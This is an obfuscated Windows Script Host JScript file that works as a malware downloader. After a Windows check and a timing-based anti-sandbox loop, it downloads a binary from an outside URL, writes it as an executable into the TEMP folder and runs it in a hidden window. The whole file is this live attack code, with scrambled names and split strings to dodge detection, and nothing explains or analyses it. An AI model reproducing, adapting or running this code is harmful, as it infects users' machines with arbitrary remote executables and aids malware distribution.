var ft = false;
var oZ = "CreateObject";
var m = function aM() {return WScript[oZ]("WScript.Shell");}(), XE = 11;
var yA = "MSXML2.XMLHTTP";
var i = 2123213;
var Ms = 0;
function g(V0){m["Run"](V0, Ms, Ms);};
function f(){return "" + yA;};
function h(T, yP){Ms = Ms * 1; return T - yP;};
function WH(){return oZ;};
/*@cc_on
  @if (@_win32 || @_win64)
    ft = true;
  @end
@*/
if (ft)
{
var cz = "";
function vF(){return 22;};
var vp = 0; var Kd = 0;
function LN()
{
var uP = new this["Date"]();
var Z = uP["getUTCMilliseconds"]();
WScript["Sleep"](vF());
var uP = new this["Date"]();
var hf = uP["getUTCMilliseconds"]();
WScript["Sleep"](vF());
var uP = new this["Date"]();
var a = uP["getUTCMilliseconds"]();
var vp = "d";
vp = h(hf, Z);
var Kd = "V";
Kd = h(a, hf);
cz = "open";
return h(vp, Kd);
}
var DM = false;
var h0 = false;
for (var x = Ms; x < vF() * 1; x++){if (LN() != Ms){
DM = true; 
Kd = "31" + 11 * vp + Kd; 
h0 = true; 
break;
}}
function E() {return ((DM == true) && (DM == h0)) ? 1 : Ms;};
if (DM && E() && h0){
function sQ() {return m["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "B8X1uKERNIoc.exe";};
 hM = f();
 wm = WScript[oZ](hM);
 var Qp = 1;
 while (Qp){
try {
wm[cz]("GET", "http://blog.insite.pt/m8djs", false);
wm["send"]();
bo = "Sleep";
for (;;){WScript[bo](vF() * 11); if (wm["readystate"] >= 2 * 2) break;};
Qp = Ms;
} catch(Lq){};
}
function Y(Ao) {var w = (1, 2, 3, 4, 5, Ao); return w;};
zD = WScript[WH()]("ADODB.Stream");
hM = zD;
hM[cz]();
hM["type"] = Y(1);
hM["write"](wm["ResponseBody"]);
zD["position"] = Y(Ms);
hM["Save" + "ToFile"](sQ(), 2);
zD["c"+"lose"]();
eS = sQ();
g(eS);
}
}

